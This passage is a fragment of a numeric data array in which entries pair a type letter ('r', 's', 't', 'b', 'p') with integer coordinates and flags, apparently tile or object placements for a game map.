0], [1, "r", 19, 189, 0], [1, "r", 19, 190, 0], [1, "r", 19, 191, 0], [1, "r", 20, 191, 0], [1, "r", 21, 191, 0], [1, "r", 22, 191, 0], [1, "r", 24, 191, 0], [1, "r", 23, 191, 0], [1, "r", 25, 191, 0], [1, "r", 25, 190, 0], [1, "r", 24, 190, 0], [1, "r", 23, 190, 0], [1, "r", 22, 190, 0], [1, "r", 21, 190, 0], [1, "r", 20, 190, 0], [1, "r", 26, 190, 0], [1, "r", 26, 191, 0], [1, "r", 24, 193, 0], [1, "r", 23, 193, 0], [1, "r", 22, 193, 0], [1, "r", 20, 192, 0], [1, "r", 21, 192, 0], [1, "r", 22, 192, 0], [1, "r", 23, 192, 0], [1, "r", 24, 192, 0], [1, "r", 25, 192, 0], [1, "r", 53, 199, 0], [1, "r", 52, 200, 0], [1, "r", 54, 199, 0], [1, "r", 55, 199, 0], [1, "r", 55, 200, 0], [1, "r", 54, 200, 0], [1, "r", 53, 200, 0], [1, "r", 51, 200, 0], [1, "r", 56, 200, 0], [1, "r", 55, 201, 0], [1, "r", 54, 201, 0], [1, "r", 55, 202, 0], [1, "r", 54, 203, 0], [1, "r", 54, 204, 0], [1, "r", 54, 202, 0], [1, "r", 53, 202, 0], [1, "r", 52, 202, 0], [1, "r", 53, 201, 0], [1, "r", 52, 201, 0], [1, "r", 51, 201, 0], [1, "r", 51, 202, 0], [1, "r", 50, 202, 0], [1, "r", 50, 201, 0], [1, "r", 56, 201, 0], [1, "r", 53, 203, 0], [1, "r", 52, 203, 0], [1, "r", 51, 203, 0], [1, "r", 56, 202, 0], [1, "r", 55, 203, 0], [1, "r", 53, 204, 0], [1, "r", 52, 204, 0], [1, "r", 55, 204, 0], [1, "r", 56, 203, 0], [1, "r", 56, 244, 0], [1, "r", 54, 246, 0], [1, "r", 50, 248, 0], [1, "r", 48, 248, 0], [1, "r", 43, 248, 0], [1, "r", 45, 238, 0], [1, "r", 44, 238, 0], [1, "r", 43, 238, 0], [1, "r", 46, 238, 0], [1, "r", 47, 238, 0], [1, "r", 48, 238, 0], [1, "r", 49, 238, 0], [1, "r", 50, 238, 0], [1, "r", 51, 238, 0], [1, "r", 52, 238, 0], [1, "r", 53, 238, 0], [1, "r", 54, 239, 0], [1, "r", 53, 240, 0], [1, "r", 53, 239, 0], [1, "r", 52, 239, 0], [1, "r", 51, 239, 0], [1, "r", 50, 239, 0], [1, "r", 49, 239, 0], [1, "r", 48, 239, 0], [1, "r", 47, 239, 0], [1, "r", 46, 239, 0], [1, "r", 45, 239, 0], [1, "r", 44, 239, 0], [1, "r", 43, 239, 0], [1, "r", 42, 239, 0], [1, "r", 41, 240, 0], [1, "r", 42, 240, 0], [1, "r", 43, 240, 0], [1, "r", 44, 240, 0], [1, "r", 45, 240, 0], [1, "r", 46, 240, 0], [1, "r", 47, 240, 0], [1, "r", 48, 240, 0], [1, "r", 49, 240, 0], [1, "r", 50, 240, 0], [1, "r", 51, 240, 0], [1, "r", 52, 240, 0], [1, "r", 54, 240, 0], [1, "r", 55, 240, 0], [1, "r", 56, 241, 0], [1, "r", 55, 241, 0], [1, "r", 54, 241, 0], [1, "r", 53, 241, 0], [1, "r", 52, 241, 0], [1, "r", 51, 241, 0], [1, "r", 49, 241, 0], [1, "r", 50, 241, 0], [1, "r", 48, 241, 0], [1, "r", 47, 241, 0], [1, "r", 46, 241, 0], [1, "r", 45, 241, 0], [1, "r", 44, 241, 0], [1, "r", 43, 241, 0], [1, "r", 42, 241, 0], [1, "r", 41, 241, 0], [1, "r", 40, 242, 0], [1, "r", 41, 242, 0], [1, "r", 42, 242, 0], [1, "r", 43, 242, 0], [1, "r", 44, 242, 0], [1, "r", 45, 242, 0], [1, "r", 46, 242, 0], [1, "r", 47, 242, 0], [1, "r", 48, 242, 0], [1, "r", 49, 242, 0], [1, "r", 50, 242, 0], [1, "r", 51, 242, 0], [1, "r", 52, 242, 0], [1, "r", 53, 242, 0], [1, "r", 54, 242, 0], [1, "r", 55, 242, 0], [1, "r", 56, 242, 0], [1, "r", 56, 243, 0], [1, "r", 55, 243, 0], [1, "r", 54, 243, 0], [1, "r", 53, 243, 0], [1, "r", 52, 243, 0], [1, "r", 51, 243, 0], [1, "r", 50, 243, 0], [1, "r", 49, 243, 0], [1, "r", 48, 243, 0], [1, "r", 47, 243, 0], [1, "r", 46, 243, 0], [1, "r", 45, 243, 0], [1, "r", 44, 243, 0], [1, "r", 43, 243, 0], [1, "r", 42, 243, 0], [1, "r", 41, 243, 0], [1, "r", 40, 243, 0], [1, "r", 40, 244, 0], [1, "r", 41, 244, 0], [1, "r", 43, 244, 0], [1, "r", 44, 244, 0], [1, "r", 45, 244, 0], [1, "r", 46, 244, 0], [1, "r", 47, 244, 0], [1, "r", 48, 244, 0], [1, "r", 49, 244, 0], [1, "r", 50, 244, 0], [1, "r", 51, 244, 0], [1, "r", 52, 244, 0], [1, "r", 53, 244, 0], [1, "r", 54, 244, 0], [1, "r", 55, 244, 0], [1, "r", 42, 244, 0], [1, "r", 40, 245, 0], [1, "r", 41, 245, 0], [1, "r", 42, 245, 0], [1, "r", 43, 245, 0], [1, "r", 44, 245, 0], [1, "r", 45, 245, 0], [1, "r", 46, 245, 0], [1, "r", 47, 245, 0], [1, "r", 48, 245, 0], [1, "r", 49, 245, 0], [1, "r", 50, 245, 0], [1, "r", 51, 245, 0], [1, "r", 52, 246, 0], [1, "r", 52, 245, 0], [1, "r", 53, 245, 0], [1, "r", 54, 245, 0], [1, "r", 55, 245, 0], [1, "r", 53, 246, 0], [1, "r", 51, 246, 0], [1, "r", 50, 246, 0], [1, "r", 49, 246, 0], [1, "r", 48, 246, 0], [1, "r", 47, 246, 0], [1, "r", 45, 246, 0], [1, "r", 46, 246, 0], [1, "r", 44, 246, 0], [1, "r", 43, 246, 0], [1, "r", 42, 246, 0], [1, "r", 41, 246, 0], [1, "r", 42, 247, 0], [1, "r", 43, 247, 0], [1, "r", 44, 247, 0], [1, "r", 45, 247, 0], [1, "r", 46, 247, 0], [1, "r", 47, 247, 0], [1, "r", 48, 247, 0], [1, "r", 50, 247, 0], [1, "r", 51, 247, 0], [1, "r", 52, 247, 0], [1, "r", 53, 247, 0], [1, "r", 54, 247, 0], [1, "r", 49, 247, 0], [1, "r", 49, 248, 0], [1, "r", 47, 248, 0], [1, "r", 46, 248, 0], [1, "r", 45, 248, 0], [1, "r", 51, 248, 0], [1, "r", 55, 246, 1], [1, "r", 55, 247, 1], [1, "r", 56, 247, 1], [1, "r", 56, 248, 1], [1, "r", 95, 270, 1], [1, "r", 93, 270, 1], [1, "r", 94, 270, 1], [1, "r", 95, 271, 1], [1, "r", 94, 271, 1], [1, "r", 93, 271, 1], [1, "r", 94, 282, 1], [1, "r", 93, 282, 1], [1, "r", 93, 281, 1], [1, "r", 92, 281, 1], [1, "r", 92, 280, 1], [1, "r", 91, 280, 1], [1, "r", 90, 279, 1], [1, "r", 95, 275, 1], [1, "r", 95, 274, 1], [1, "r", 95, 273, 1], [1, "r", 95, 272, 1], [1, "r", 94, 274, 1], [1, "r", 94, 273, 1], [1, "r", 94, 272, 1], [1, "r", 93, 272, 1], [1, "r", 93, 273, 1], [1, "r", 93, 274, 1], [1, "r", 92, 273, 1], [1, "r", 92, 272, 1], [1, "r", 92, 270, 1], [1, "r", 92, 271, 1], [1, "r", 92, 269, 1], [1, "r", 90, 269, 1], [1, "r", 91, 269, 1], [1, "r", 91, 271, 1], [1, "r", 91, 270, 1], [1, "r", 95, 278, 1], [1, "r", 95, 277, 1], [1, "r", 95, 276, 1], [1, "r", 94, 276, 1], [1, "r", 94, 275, 1], [1, "r", 93, 275, 1], [1, "r", 92, 274, 1], [1, "r", 92, 275, 1], [1, "r", 91, 275, 1], [1, "r", 90, 275, 1], [1, "r", 89, 274, 1], [1, "r", 90, 274, 1], [1, "r", 89, 275, 1], [1, "r", 88, 274, 1], [1, "r", 88, 273, 1], [1, "r", 86, 272, 1], [1, "r", 85, 271, 1], [1, "r", 86, 271, 1], [1, "r", 87, 272, 1], [1, "r", 55, 248, 1], [1, "r", 54, 248, 1], [1, "r", 56, 249, 1], [1, "r", 55, 249, 1], [1, "r", 55, 250, 1], [1, "r", 56, 250, 1], [1, "r", 57, 250, 1], [1, "r", 57, 249, 1], [1, "r", 59, 250, 1], [1, "r", 58, 250, 1], [1, "r", 60, 250, 1], [1, "r", 61, 251, 1], [1, "r", 60, 251, 1], [1, "r", 62, 251, 1], [1, "r", 62, 252, 1], [1, "r", 63, 252, 1], [1, "r", 58, 251, 1], [1, "r", 57, 251, 1], [1, "r", 56, 251, 1], [1, "r", 58, 252, 1], [1, "r", 57, 252, 1], [1, "r", 57, 253, 1], [1, "r", 58, 253, 1], [1, "r", 58, 254, 1], [1, "r", 59, 255, 1], [1, "r", 58, 255, 1], [1, "r", 57, 254, 1], [1, "r", 56, 252, 1], [1, "r", 55, 251, 1], [1, "r", 60, 255, 1], [1, "r", 61, 255, 1], [1, "r", 61, 256, 1], [1, "r", 60, 256, 1], [1, "r", 62, 256, 1], [1, "r", 62, 257, 1], [1, "r", 61, 257, 1], [1, "r", 64, 253, 1], [1, "r", 64, 254, 1], [1, "r", 65, 254, 1], [1, "r", 61, 250, 1], [1, "r", 64, 252, 1], [1, "r", 65, 253, 1], [1, "r", 66, 254, 1], [1, "r", 65, 255, 1], [1, "r", 64, 255, 1], [1, "r", 64, 256, 1], [1, "r", 65, 256, 1], [1, "r", 65, 257, 1], [1, "r", 64, 257, 1], [1, "r", 63, 257, 1], [1, "r", 62, 258, 1], [1, "r", 63, 258, 1], [1, "r", 64, 258, 1], [1, "r", 66, 255, 1], [1, "r", 66, 256, 1], [1, "r", 66, 257, 1], [1, "r", 66, 258, 1], [1, "r", 65, 258, 1], [1, "r", 67, 258, 1], [1, "r", 67, 257, 1], [1, "r", 67, 259, 1], [1, "r", 66, 259, 1], [1, "r", 65, 259, 1], [1, "r", 56, 246, 1], [1, "r", 56, 245, 1], [1, "r", 68, 258, 1], [1, "r", 68, 259, 1], [1, "r", 68, 260, 1], [1, "r", 69, 260, 1], [1, "r", 69, 261, 1], [1, "r", 70, 261, 1], [1, "r", 71, 261, 1], [1, "r", 67, 260, 1], [1, "r", 89, 269, 1], [1, "r", 89, 268, 1], [1, "r", 90, 268, 1], [1, "r", 82, 267, 1], [1, "r", 83, 267, 1], [1, "r", 80, 266, 1], [1, "r", 81, 266, 1], [1, "r", 81, 267, 1], [1, "r", 79, 266, 1], [1, "r", 78, 265, 1], [1, "r", 77, 265, 1], [1, "r", 76, 264, 1], [1, "r", 75, 264, 1], [1, "r", 75, 263, 1], [1, "r", 74, 263, 1], [1, "r", 74, 262, 1], [1, "r", 72, 262, 1], [1, "r", 73, 262, 1], [1, "r", 71, 262, 1], [1, "r", 85, 270, 1], [1, "r", 84, 270, 1], [1, "r", 84, 269, 1], [1, "r", 83, 269, 1], [1, "r", 82, 269, 1], [1, "r", 81, 269, 1], [1, "r", 81, 268, 1], [1, "r", 82, 268, 1], [1, "r", 83, 268, 1], [1, "r", 80, 268, 1], [1, "r", 80, 267, 1], [1, "r", 79, 267, 1], [1, "r", 78, 266, 1], [1, "r", 76, 265, 1], [1, "r", 75, 262, 1], [1, "r", 90, 280, 1], [1, "r", 89, 280, 1], [1, "r", 89, 279, 1], [1, "r", 88, 279, 1], [1, "r", 88, 278, 1], [1, "r", 87, 277, 1], [1, "r", 86, 276, 1], [1, "r", 86, 275, 1], [1, "r", 86, 274, 1], [1, "r", 86, 273, 1], [1, "r", 85, 273, 1], [1, "r", 85, 272, 1], [1, "r", 85, 274, 1], [1, "r", 86, 277, 1], [1, "r", 87, 278, 1], [1, "r", 84, 271, 1], [1, "r", 83, 270, 1], [1, "r", 87, 273, 1], [1, "r", 91, 274, 1], [1, "r", 89, 273, 1], [1, "r", 88, 272, 1], [1, "r", 91, 281, 1], [1, "r", 92, 282, 1], [1, "r", 88, 280, 1], [1, "r", 87, 279, 1], [1, "r", 85, 275, 1], [1, "r", 84, 273, 1], [1, "r", 84, 272, 1], [1, "r", 83, 271, 1], [1, "r", 82, 270, 1], [1, "r", 84, 267, 0], [1, "r", 85, 267, 0], [1, "r", 76, 262, 0], [1, "r", 77, 262, 0], [1, "r", 88, 268, 0], [1, "r", 78, 262, 0], [1, "r", 79, 262, 0], [1, "r", 80, 262, 0], [1, "r", 80, 263, 0], [1, "r", 81, 263, 0], [1, "r", 82, 263, 0], [1, "r", 83, 263, 0], [1, "r", 84, 263, 0], [1, "r", 85, 263, 0], [1, "r", 88, 262, 0], [1, "r", 89, 262, 0], [1, "r", 90, 262, 0], [1, "r", 87, 262, 0], [1, "r", 86, 262, 0], [1, "r", 86, 263, 0], [1, "r", 87, 263, 0], [1, "r", 91, 262, 0], [1, "r", 95, 262, 0], [1, "r", 94, 262, 0], [1, "r", 86, 267, 0], [1, "r", 87, 267, 0], [1, "r", 87, 268, 0], [1, "r", 86, 268, 0], [1, "r", 74, 189, 0], [1, "r", 75, 189, 0], [1, "r", 76, 189, 0], [1, "r", 77, 189, 0], [1, "r", 78, 190, 0], [1, "r", 77, 190, 0], [1, "r", 75, 190, 0], [1, "r", 76, 190, 0], [1, "r", 74, 190, 0], [1, "r", 73, 190, 0], [1, "r", 78, 191, 0], [1, "r", 76, 191, 0], [1, "r", 77, 191, 0], [1, "r", 75, 191, 0], [1, "r", 74, 191, 0], [1, "r", 78, 192, 0], [1, "r", 77, 192, 0], [1, "r", 76, 192, 0], [1, "r", 75, 192, 0], [1, "r", 74, 192, 0], [1, "r", 73, 191, 0], [1, "f", 1, 96, 22, 1], [1, "s", 1, 97, 22, 1], [1, "f", 1, 98, 22, 1], [1, "s", 0, 99, 22, 1], [1, "s", 1, 100, 21, 1], [1, "s", 1, 96, 49, 1], [1, "s", 1, 100, 50, 1], [1, "s", 0, 99, 49, 1], [1, "s", 0, 97, 49, 1], [1, "f", 1, 98, 49, 1], [1, "r", 70, 218, 0], [1, "r", 71, 218, 0], [1, "r", 72, 218, 0], [1, "r", 73, 218, 0], [1, "r", 74, 219, 0], [1, "r", 73, 219, 0], [1, "r", 72, 219, 0], [1, "r", 71, 219, 0], [1, "r", 70, 219, 0], [1, "r", 73, 220, 0], [1, "r", 72, 220, 0], [1, "r", 71, 220, 0], [1, "r", 72, 221, 0], [1, "r", 71, 221, 0], [1, "r", 70, 221, 0], [1, "r", 69, 221, 0], [1, "r", 68, 221, 0], [1, "r", 70, 220, 0], [1, "r", 69, 220, 0], [1, "r", 69, 219, 0], [1, "r", 68, 220, 0], [1, "r", 73, 221, 0], [1, "r", 73, 222, 0], [1, "r", 71, 222, 0], [1, "r", 72, 222, 0], [1, "r", 74, 221, 0], [1, "r", 74, 220, 0], [1, "r", 75, 220, 0], [1, "r", 75, 221, 0], [1, "r", 70, 222, 0], [1, "r", 69, 222, 0], [1, "r", 29, 217, 0], [1, "r", 30, 217, 0], [1, "r", 31, 217, 0], [1, "r", 32, 217, 0], [1, "r", 31, 219, 0], [1, "r", 30, 219, 0], [1, "r", 29, 219, 0], [1, "r", 27, 219, 0], [1, "r", 25, 219, 0], [1, "r", 26, 219, 0], [1, "r", 28, 219, 0], [1, "r", 26, 218, 0], [1, "r", 27, 218, 0], [1, "r", 28, 218, 0], [1, "r", 29, 218, 0], [1, "r", 30, 218, 0], [1, "r", 28, 217, 0], [1, "r", 26, 217, 0], [1, "r", 27, 217, 0], [1, "r", 28, 216, 0], [1, "r", 29, 216, 0], [1, "r", 30, 216, 0], [1, "r", 31, 218, 0], [1, "r", 32, 218, 0], [1, "r", 31, 216, 0], [1, "r", 31, 221, 0], [1, "r", 31, 220, 0], [1, "r", 30, 220, 0], [1, "r", 29, 220, 0], [1, "r", 28, 220, 0], [1, "r", 27, 220, 0], [1, "r", 26, 220, 0], [1, "r", 25, 218, 0], [1, "r", 27, 221, 0], [1, "r", 28, 221, 0], [1, "r", 29, 221, 0], [1, "r", 30, 221, 0], [1, "r", 32, 220, 0], [1, "r", 32, 219, 0], [1, "r", 33, 218, 0], [1, "r", 33, 219, 0], [1, "r", 75, 238, 0], [1, "r", 76, 238, 0], [1, "r", 77, 239, 0], [1, "r", 76, 239, 0], [1, "r", 75, 239, 0], [1, "r", 74, 239, 0], [1, "r", 76, 240, 0], [1, "r", 77, 240, 0], [1, "r", 78, 240, 0], [1, "r", 77, 241, 0], [1, "r", 76, 241, 0], [1, "r", 75, 241, 0], [1, "r", 75, 240, 0], [1, "r", 74, 240, 0], [1, "r", 78, 239, 0], [1, "r", 77, 238, 0], [1, "r", 18, 253, 0], [1, "r", 19, 252, 0], [1, "r", 20, 252, 0], [1, "r", 21, 253, 0], [1, "r", 23, 254, 0], [1, "r", 20, 254, 0], [1, "r", 19, 254, 0], [1, "r", 22, 254, 0], [1, "r", 18, 254, 0], [1, "r", 19, 253, 0], [1, "r", 20, 253, 0], [1, "r", 21, 254, 0], [1, "r", 22, 253, 0], [1, "r", 21, 255, 0], [1, "r", 20, 255, 0], [1, "r", 19, 255, 0], [1, "r", 18, 255, 0], [1, "r", 17, 255, 0], [1, "r", 17, 254, 0], [1, "r", 22, 255, 0], [1, "r", 19, 256, 0], [1, "r", 20, 256, 0], [1, "r", 21, 256, 0], [1, "r", 39, 270, 0], [1, "r", 40, 270, 0], [1, "r", 41, 270, 0], [1, "r", 43, 270, 0], [1, "r", 44, 270, 0], [1, "r", 46, 270, 0], [1, "r", 42, 270, 0], [1, "r", 45, 270, 0], [1, "r", 44, 269, 0], [1, "r", 43, 269, 0], [1, "r", 42, 269, 0], [1, "r", 40, 269, 0], [1, "r", 41, 269, 0], [1, "r", 45, 271, 0], [1, "r", 44, 271, 0], [1, "r", 43, 271, 0], [1, "r", 42, 271, 0], [1, "r", 41, 271, 0], [1, "r", 40, 271, 0], [1, "r", 39, 271, 0], [1, "r", 46, 271, 0], [1, "r", 45, 272, 0], [1, "r", 44, 272, 0], [1, "r", 43, 272, 0], [1, "r", 42, 272, 0], [1, "r", 19, 284, 0], [1, "r", 20, 284, 0], [1, "r", 21, 285, 0], [1, "r", 22, 285, 0], [1, "r", 23, 286, 0], [1, "r", 22, 288, 0], [1, "r", 20, 288, 0], [1, "r", 18, 288, 0], [1, "r", 17, 287, 0], [1, "r", 16, 287, 0], [1, "r", 16, 286, 0], [1, "r", 17, 286, 0], [1, "r", 18, 286, 0], [1, "r", 19, 286, 0], [1, "r", 20, 286, 0], [1, "r", 21, 286, 0], [1, "r", 22, 286, 0], [1, "r", 20, 285, 0], [1, "r", 19, 285, 0], [1, "r", 18, 285, 0], [1, "r", 17, 285, 0], [1, "r", 19, 287, 0], [1, "r", 18, 287, 0], [1, "r", 20, 287, 0], [1, "r", 21, 287, 0], [1, "r", 22, 287, 0], [1, "r", 23, 287, 0], [1, "r", 21, 288, 0], [1, "r", 19, 288, 0], [1, "r", 17, 288, 0], [1, "r", 19, 289, 0], [1, "r", 21, 289, 0], [1, "r", 22, 289, 0], [1, "r", 20, 289, 0], [1, "r", 23, 288, 0], [1, "r", 24, 287, 0], [1, "r", 24, 286, 0], [1, "r", 23, 285, 0], [1, "r", 66, 286, 0], [1, "r", 64, 287, 0], [1, "r", 63, 287, 0], [1, "r", 60, 287, 0], [1, "r", 59, 285, 0], [1, "r", 58, 284, 0], [1, "r", 59, 283, 0], [1, "r", 65, 283, 0], [1, "r", 64, 283, 0], [1, "r", 63, 283, 0], [1, "r", 62, 283, 0], [1, "r", 61, 283, 0], [1, "r", 60, 283, 0], [1, "r", 59, 284, 0], [1, "r", 58, 285, 0], [1, "r", 60, 286, 0], [1, "r", 59, 286, 0], [1, "r", 61, 287, 0], [1, "r", 62, 287, 0], [1, "r", 61, 286, 0], [1, "r", 62, 286, 0], [1, "r", 63, 286, 0], [1, "r", 64, 286, 0], [1, "r", 65, 286, 0], [1, "r", 67, 285, 0], [1, "r", 66, 285, 0], [1, "r", 65, 285, 0], [1, "r", 64, 285, 0], [1, "r", 63, 285, 0], [1, "r", 62, 285, 0], [1, "r", 61, 285, 0], [1, "r", 60, 285, 0], [1, "r", 60, 284, 0], [1, "r", 61, 284, 0], [1, "r", 62, 284, 0], [1, "r", 63, 284, 0], [1, "r", 64, 284, 0], [1, "r", 65, 284, 0], [1, "r", 66, 284, 0], [1, "r", 65, 287, 0], [1, "r", 67, 286, 0], [1, "p", 0, 13, 189, 1], [1, "p", 0, 32, 184, 1], [1, "p", 0, 47, 191, 1], [1, "p", 0, 64, 184, 1], [1, "p", 0, 84, 192, 1], [1, "p", 0, 78, 207, 1], [1, "p", 0, 58, 216, 1], [1, "p", 0, 41, 211, 1], [1, "p", 0, 18, 211, 1], [1, "p", 0, 14, 230, 1], [1, "p", 0, 29, 237, 1], [1, "p", 0, 50, 230, 1], [1, "p", 0, 78, 241, 1], [1, "p", 0, 74, 256, 1], [1, "p", 0, 68, 266, 1], [1, "p", 0, 48, 259, 1], [1, "p", 0, 31, 263, 1], [1, "p", 0, 18, 274, 1], [1, "p", 0, 33, 283, 1], [1, "p", 0, 66, 287, 1], [1, "p", 0, 82, 291, 1], [1, "p", 0, 16, 295, 1], [1, "p", 0, 45, 294, 1], [1, "p", 0, 18, 252, 1], [1, "p", 0, 79, 227, 1], [1, "p", 0, 32, 200, 1], [1, "p", 0, 64, 200, 1], [1, "s", 0, 21, 193, 1], [1, "s", 1, 18, 189, 1], [1, "s", 2, 26, 189, 1], [1, "b", 1, 15, 181, 0], [1, "b", 2, 18, 190, 0], [1, "b", 2, 29, 193, 0], [1, "t", 3, 16, 182, 0], [1, "t", 3, 13, 195, 0], [1, "t", 4, 16, 183, 0], [1, "t", 5, 10, 184, 0], [1, "t", 5, 23, 182, 0], [1, "t", 4, 30, 187, 0], [1, "t", 1, 26, 192, 0], [1, "b", 1, 25, 188, 0], [1, "s", 1, 24, 181, 1], [1, "t", 3, 33, 183, 0], [1, "b", 1, 36, 189, 0], [1, "t", 2, 35, 190, 0], [1, "b", 3, 19, 200, 0], [1, "s", 0, 28, 194, 1], [1, "s", 1, 32, 196, 1], [1, "s", 1, 36, 183, 1], [1, "s", 2, 38, 184, 1], [1, "s", 2, 10, 192, 1], [1, "s", 2, 12, 183, 1], [1, "s", 1, 15, 199, 1], [1, "b", 0, 12, 202, 0], [1, "t", 2, 13, 203, 0], [1, "t", 4, 20, 200, 0], [1, "t", 4, 12, 194, 0], [1, "t", 5, 15, 205, 0], [1, "t", 5, 29, 200, 0], [1, "t", 3, 28, 201, 0], [1, "s", 2, 25, 199, 1], [1, "s", 1, 22, 204, 1], [1, "g", 2, 25, 205, 1], [1, "b", 1, 27, 216, 0], [1, "s", 1, 25, 217, 1], [1, "s", 1, 33, 217, 1], [1, "s", 2, 35, 215, 1], [1, "s", 0, 32, 221, 1], [1, "t", 2, 31, 222, 0], [1, "t", 4, 26, 221, 0], [1, "b", 3, 27, 222, 0], [1, "b", 0, 17, 217, 0], [1, "t", 3, 18, 216, 0], [1, "t", 4, 13, 215, 0], [1, "t", 5, 30, 213, 0], [1, "t", 5, 24, 208, 0], [1, "s", 1, 12, 216, 1], [1, "s", 2, 11, 210, 1], [1, "s", 2, 34, 223, 1], [1, "b", 2, 36, 218, 0], [1, "t", 4, 40, 206, 0], [1, "t", 5, 35, 203, 0], [1, "t", 3, 39, 206, 0], [1, "b", 1, 34, 204, 0], [1, "s", 1, 33, 206, 1], [1, "s", 1, 42, 203, 1], [1, "s", 0, 47, 196, 1], [1, "b", 2, 40, 196, 0], [1, "t", 4, 39, 197, 0], [1, "t", 5, 44, 187, 0], [1, "b", 1, 46, 181, 0], [1, "t", 2, 47, 182, 0], [1, "b", 0, 57, 182, 0], [1, "b", 3, 56, 183, 0], [1, "t", 4, 55, 184, 0], [1, "t", 5, 62, 195, 0], [1, "s", 1, 51, 185, 1], [1, "s", 2, 62, 180, 1], [1, "s", 2, 61, 188, 1], [1, "s", 1, 61, 189, 1], [1, "s", 2, 48, 195, 1], [1, "b", 1, 51, 199, 0], [1, "t", 2, 52, 199, 0], [1, "t", 3, 56, 204, 0], [1, "t", 4, 57, 204, 0], [1, "t", 4, 51, 204, 0], [1, "s", 1, 52, 205, 1], [1, "s", 2, 57, 200, 1], [1, "s", 1, 56, 199, 1], [1, "b", 0, 55, 192, 0], [1, "t", 3, 56, 193, 0], [1, "t", 4, 50, 190, 0], [1, "b", 1, 76, 188, 0], [1, "t", 2, 75, 188, 0], [1, "t", 2, 73, 192, 0], [1, "t", 4, 72, 191, 0], [1, "t", 5, 78, 193, 0], [1, "b", 0, 79, 192, 0], [1, "s", 2, 79, 190, 1], [1, "s", 1, 74, 194, 1], [1, "s", 1, 72, 187, 1], [1, "s", 0, 74, 183, 1], [1, "s", 1, 75, 183, 1], [1, "t", 2, 69, 181, 0], [1, "t", 4, 70, 182, 0], [1, "t", 5, 69, 180, 0], [1, "b", 1, 65, 189, 0], [1, "b", 2, 66, 189, 0], [1, "t", 3, 64, 188, 0], [1, "t", 4, 67, 192, 0], [1, "b", 2, 85, 183, 0], [1, "t", 1, 84, 184, 0], [1, "t", 4, 81, 180, 0], [1, "t", 5, 89, 180, 0], [1, "t", 0, 90, 188, 0], [1, "t", 3, 89, 190, 0], [1, "s", 1, 87, 187, 1], [1, "s", 2, 87, 197, 1], [1, "b", 1, 84, 200, 0], [1, "t", 2, 83, 201, 0], [1, "t", 4, 87, 207, 0], [1, "s", 2, 79, 202, 1], [1, "s", 1, 80, 203, 1], [1, "t", 0, 71, 200, 0], [1, "b", 2, 72, 201, 0], [1, "t", 2, 65, 205, 0], [1, "t", 1, 66, 206, 0], [1, "t", 4, 63, 209, 0], [1, "t", 5, 73, 203, 0], [1, "s", 0, 70, 207, 1], [1, "s", 1, 71, 206, 1], [1, "s", 2, 68, 199, 1], [1, "s", 1, 64, 213, 1], [1, "t", 0, 85, 213, 0], [1, "b", 2, 84, 212, 0], [1, "t", 3, 77, 209, 0], [1, "t", 4, 83, 216, 0], [1, "t", 4, 73, 209, 0], [1, "b", 0, 86, 222, 0], [1, "b", 3, 87, 221, 0], [1, "s", 1, 80, 214, 1], [1, "s", 2, 87, 216, 1], [1, "s", 2, 84, 224, 1], [1, "s", 1, 77, 227, 1], [1, "t", 1, 74, 222, 0], [1, "b", 1, 69, 218, 0], [1, "b", 2, 75, 219, 0], [1, "s", 2, 74, 218, 1], [1, "s", 1, 69, 223, 1], [1, "s", 1, 77, 221, 1], [1, "b", 1, 72, 211, 0], [1, "b", 1, 85, 232, 0], [1, "t", 2, 84, 233, 0], [1, "t", 2, 78, 238, 0], [1, "b", 1, 77, 237, 0], [1, "t", 5, 87, 236, 0], [1, "t", 5, 76, 229, 0], [1, "b", 2, 74, 241, 0], [1, "s", 0, 73, 242, 1], [1, "s", 0, 81, 238, 1], [1, "s", 1, 82, 237, 1], [1, "s", 2, 72, 237, 1], [1, "s", 2, 78, 242, 1], [1, "b", 1, 66, 230, 0], [1, "b", 2, 62, 229, 0], [1, "t", 4, 67, 231, 0], [1, "t", 4, 62, 228, 0], [1, "t", 5, 64, 233, 0], [1, "t", 2, 65, 234, 0], [1, "t", 2, 51, 220, 0], [1, "t", 1, 50, 218, 0], [1, "b", 1, 45, 223, 0], [1, "b", 2, 46, 224, 0], [1, "t", 4, 49, 218, 0], [1, "t", 4, 47, 225, 0], [1, "s", 1, 50, 215, 1], [1, "s", 2, 51, 213, 1], [1, "s", 2, 42, 227, 1], [1, "s", 1, 44, 227, 1], [1, "s", 1, 60, 230, 1], [1, "s", 2, 59, 231, 1], [1, "b", 1, 85, 252, 0], [1, "t", 2, 84, 251, 0], [1, "t", 2, 74, 250, 0], [1, "t", 0, 75, 251, 0], [1, "b", 0, 83, 246, 0], [1, "t", 3, 82, 247, 0], [1, "t", 4, 81, 259, 0], [1, "t", 4, 69, 249, 0], [1, "t", 5, 87, 246, 0], [1, "t", 5, 75, 252, 0], [1, "s", 1, 79, 257, 1], [1, "s", 2, 78, 249, 1], [1, "s", 2, 80, 258, 1], [1, "s", 1, 88, 254, 1], [1, "s", 1, 85, 264, 1], [1, "s", 2, 89, 263, 1], [1, "s", 2, 87, 269, 1], [1, "s", 0, 84, 268, 1], [1, "s", 2, 76, 267, 1], [1, "s", 1, 66, 261, 1], [1, "s", 1, 87, 274, 1], [1, "s", 1, 76, 263, 1], [1, "s", 1, 59, 251, 1], [1, "s", 0, 59, 252, 1], [1, "t", 2, 86, 265, 0], [1, "t", 0, 78, 270, 0], [1, "t", 2, 79, 271, 0], [1, "t", 0, 77, 260, 0], [1, "t", 3, 78, 261, 0], [1, "b", 1, 71, 264, 0], [1, "b", 1, 88, 269, 0], [1, "t", 5, 84, 264, 0], [1, "t", 5, 79, 261, 0], [1, "t", 5, 72, 265, 0], [1, "t", 5, 77, 270, 0], [1, "t", 0, 87, 261, 0], [1, "t", 2, 86, 260, 0], [1, "t", 4, 84, 255, 0], [1, "t", 4, 68, 255, 0], [1, "t", 1, 67, 254, 0], [1, "t", 2, 65, 262, 0], [1, "t", 1, 57, 260, 0], [1, "t", 2, 58, 259, 0], [1, "b", 1, 63, 256, 0], [1, "b", 1, 52, 248, 0], [1, "t", 2, 53, 248, 0], [1, "s", 1, 50, 253, 1], [1, "s", 2, 67, 263, 1], [1, "s", 2, 52, 252, 1], [1, "s", 2, 71, 244, 1], [1, "b", 0, 57, 245, 0], [1, "t", 2, 58, 244, 0], [1, "b", 1, 53, 237, 0], [1, "t", 2, 54, 237, 0], [1, "t", 2, 41, 238, 0], [1, "t", 1, 42, 237, 0], [1, "t", 5, 57, 235, 0], [1, "t", 5, 60, 246, 0], [1, "t", 5, 50, 252, 0], [1, "t", 1, 42, 248, 0], [1, "b", 1, 43, 249, 0], [1, "b", 3, 37, 243, 0], [1, 